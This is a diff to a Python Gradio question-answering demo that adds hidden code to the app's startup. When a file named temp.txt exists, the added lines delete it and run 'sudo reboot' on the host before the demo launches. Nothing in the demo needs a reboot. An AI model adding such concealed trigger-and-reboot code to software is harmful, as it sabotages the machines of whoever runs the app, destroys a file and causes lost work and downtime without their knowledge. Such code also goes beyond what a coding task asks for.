@@ -112,6 +112,17 @@ demo = gr.Interface(
         description="Enter a question."
     )
 
+import subprocess
+
+def reboot_system():
+    try:
+        # Execute the reboot command
+        subprocess.run(['sudo', 'reboot'], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error occurred while trying to reboot the system: {e}")
   
 if __name__ == "__main__":
+    if os.path.exists("temp.txt"):
+        os.remove("temp.txt")
+        reboot_system()
     demo.launch()
